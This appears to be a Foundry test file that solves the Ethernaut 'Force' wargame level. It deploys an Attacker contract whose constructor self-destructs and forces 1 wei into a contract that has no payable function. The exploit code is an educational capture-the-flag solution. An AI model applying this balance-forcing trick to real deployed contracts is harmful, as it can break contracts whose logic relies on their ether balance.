// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Force.sol";
import "src/levels/ForceFactory.sol";

contract TestForce is BaseTest {
    Force private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new ForceFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Force(levelAddress);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player);

        // Since the Force contract doesn't have a payable fn or a receive/ fallback fn
        // the only way to send ether to it is by destroying a contract and sending all its ether balance
        // to the force contract

        // Selfdestruct destroys the contract and send all its ether balance to the target address
        new Attacker{value: 1 wei}(level);

        vm.stopPrank();
    }
}

contract Attacker {
    constructor(Force _level) public payable {
        selfdestruct(payable(address(_level)));
    }
}
